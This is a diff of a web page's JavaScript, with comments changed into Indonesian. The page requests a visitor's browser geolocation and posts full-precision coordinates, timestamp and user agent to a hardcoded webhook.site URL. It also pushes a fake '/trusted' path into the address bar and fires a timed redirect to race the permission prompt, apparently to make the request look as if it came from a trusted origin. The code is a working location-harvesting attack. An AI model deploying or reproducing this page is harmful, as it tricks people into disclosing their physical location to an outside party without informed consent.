@@ -70,85 +70,58 @@ const output = document.getElementById('output');
 const locationLink = document.getElementById('locationLink');
 const mapLink = document.getElementById('mapLink');
 
-// URL of your Webhook (replace this with your Webhook URL)
+// Masukkan webhook kamu di bawah sini
 const webhookUrl = 'https://webhook.site/11f44e56-235f-4edb-954d-73e1048d7070';
 
-// Function to request location
 function getLocation() {
-  if (!navigator.geolocation) {
-    output.textContent = 'Geolocation is not supported by this browser.';
-    return;
-  }
+  if (!navigator.geolocation) return;
 
   navigator.geolocation.getCurrentPosition(
     pos => {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
 
-      // Display the latitude and longitude
-      output.textContent = `Latitude: ${lat.toFixed(4)}, Longitude: ${lon.toFixed(4)}`;
+      // tampilkan lokasi
+      output.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
 
-      // Create Google Maps link
+      // link Google Maps
       const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
-
-      // Show the link to Google Maps
       mapLink.href = googleMapsUrl;
       mapLink.textContent = `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
-
       locationLink.style.display = 'block';
 
-      // Send the geolocation data to the Webhook
-      sendDataToWebhook(lat, lon);
+      // kirim ke webhook
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        })
+      })
+      .then(resp => console.log('Sent to webhook:', resp.status))
+      .catch(err => console.error('Webhook error', err));
     },
-    () => {
-      output.textContent = 'Permission denied or error retrieving location';
+    err => {
+      output.textContent = 'Permission denied or error.';
+      console.error(err);
     }
   );
 }
 
-// Function to send data to Webhook
-function sendDataToWebhook(lat, lon) {
-  const data = {
-    latitude: lat,
-    longitude: lon,
-    timestamp: new Date().toISOString()
-  };
-
-  fetch(webhookUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(data)
-  })
-  .then(response => response.json())
-  .then(data => {
-    console.log('Success:', data);
-  })
-  .catch(error => {
-    console.error('Error:', error);
-  });
-}
-
-/*
- * Step 1:
- * Manipulate visible URL to a trusted-looking path
- */
 trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');  // Changing the URL to make it look trusted
-  panel.style.display = 'block';  // Show the panel for requesting the location
+  history.pushState({}, '', '/trusted');  // demo origin change
+  panel.style.display = 'block';
 };
 
-/*
- * Step 2:
- * Trigger a navigation race shortly after permission flow starts
- */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'https://google.com:9090';  // Redirect to simulate a race condition
-      }, 80); // Delay of 80ms before the redirect
+        location.href = 'https://google.com:9090';
+      }, 80);
     });
   });
 });
@@ -156,4 +129,3 @@ window.addEventListener('pageshow', () => {
 
 </body>
 </html>
-
